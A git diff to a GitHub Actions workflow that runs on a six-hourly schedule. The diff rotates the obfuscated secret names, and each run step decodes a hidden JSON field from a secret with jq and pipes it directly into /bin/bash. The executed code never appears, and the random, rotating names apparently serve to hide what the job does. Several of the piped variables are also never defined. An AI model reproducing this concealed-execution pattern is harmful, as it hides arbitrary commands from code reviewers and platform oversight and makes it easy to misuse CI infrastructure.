@@ -1,9 +1,8 @@
 name: chengjisi0987
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 0/6 * * *'
+    - cron: '5 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,18 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: chengjisi0987
         env:
-          nvzlj89: ${{ secrets.nvzlj89 }}
+          kzb4: ${{ secrets.kzb4 }}
         run: |
-          echo $nvzlj89 | jq -r .bv597 | /bin/bash
-          echo $rww325 | jq -r .kz5717 | /bin/bash
-          echo $fxk973 | jq -r .mvhw9925 | /bin/bash
-          echo $xex2324 | jq -r .tke0410 | /bin/bash
-          echo $ryu2514 | jq -r .xait109 | /bin/bash
-          echo $js511 | jq -r .e67644 | /bin/bash
-          echo $ifzh840 | jq -r .xrpz9563 | /bin/bash
-          echo $h59028 | jq -r .l305 | /bin/bash
-          echo $mr5747 | jq -r .ita09889 | /bin/bash
-          echo $r6 | jq -r .y5429 | /bin/bash
-          echo $dtyc66853 | jq -r .o7847 | /bin/bash
-          echo $wo303 | jq -r .lribw59593 | /bin/bash
+          echo $kzb4 | jq -r .pr4 | /bin/bash
+          echo $emksy3 | jq -r .kzl7 | /bin/bash
+          echo $rvfyi9750 | jq -r .cxpad1 | /bin/bash
+          echo $pkv381 | jq -r .o02 | /bin/bash
+          echo $fxl1824 | jq -r .ghm5533 | /bin/bash
+          echo $yc1418 | jq -r .yhyre2 | /bin/bash
 
